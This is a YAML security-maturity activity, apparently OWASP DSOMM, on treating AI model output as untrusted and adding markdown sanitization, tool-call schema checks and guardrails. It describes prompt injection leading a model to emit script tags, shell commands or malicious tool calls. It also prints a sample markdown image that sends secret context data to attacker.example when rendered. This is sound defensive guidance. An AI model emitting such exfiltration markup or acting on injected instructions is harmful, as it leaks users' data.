    Secure output handling in AI applications:
      uuid: 24990a5e-b0e6-4e2c-b06b-4e9f0d6f7b21
      description: |-
        Model output is attacker-influenceable: prompt injection can make an
        AI feature emit script tags, shell commands or malicious tool calls.
        If the application renders or executes such responses unvalidated,
        classic attacks (cross-site scripting, command and SQL injection)
        reach their sinks through a new path. Model responses must therefore
        be treated like user input. The sink-side controls are already defined
        in OWASP DSOMM [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7); this activity applies them to the
        AI features the organization ships (chat UIs, retrieval-augmented
        generation (RAG) features, tool-calling agents) and adds the
        AI-specific controls: strict markdown rendering, schema enforcement
        for tool calls and output guardrails.

        The core of this activity is a reference: model responses are
        untrusted data, and the sink-side controls are already defined in
        [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7) (Implementation, Application
        Hardening): safe framework bindings, encoding libraries,
        parameterized APIs, Content Security Policy. Apply them to model
        output exactly as to user input.

        AI-specific additions on top of it:

        - **Markdown rendering in chat UIs**: render with inline HTML
          disabled (e.g. `markdown-it` with `html: false`) plus an
          allow-list HTML sanitizer (e.g. DOMPurify). Markdown links and
          images are a data exfiltration channel: An injected
          `![](https://attacker.example/?d=<secret>)` leaks context data on
          render without any click. So block or proxy external images and
          restrict link/image URLs to trusted domains.
        - **Tool/function calls**: enforce a JSON schema on structured
          output, validate tool-call arguments against allow-lists and
          require human confirmation for sensitive calls.

        Whether the content of a response is factually correct is a separate
        concern, see _Hallucination detection for AI responses_.
      risk: |-
        An attacker uses prompt injection to make the model emit malicious output,
        which the application then executes or renders: cross-site scripting,
        command or SQL injection, or unauthorized high-privilege tool calls.
      measure: |-
        Treat model responses as untrusted data and apply the existing activity
        [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7) to them at every sink (browser, shell,
        SQL, downstream systems). Add the AI-specific controls on top: strict
        markdown rendering, schema enforcement for tool calls and output
        guardrails.
      dependsOn:
        - 0012e51c-a068-4549-a4d5-d1957b52676f # Input validation for AI systems
        - e1f37abb-d848-4a3a-b3df-65e91a89dcb7 # Context-aware output encoding
      assessment: |
        - Show the rendering pipeline for model output (markdown renderer settings, sanitizer configuration, Content Security Policy).
        - Show the schema validation for structured output and the confirmation step for sensitive tool calls.
        - Demonstrate with a test that injected markup and markdown-based exfiltration (external images/links) are neutralized.
      difficultyOfImplementation:
        knowledge: 3
        time: 3
        resources: 2
      usefulness: 5
      level: 4
      tags:
        - ai
        - data-protection
        - input-validation
      implementation:
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c07
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-llm-top-10
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/guardrails-ai
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/nemo-guardrails
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/dompurify
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-cheatsheet-series
        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-ai-exchange
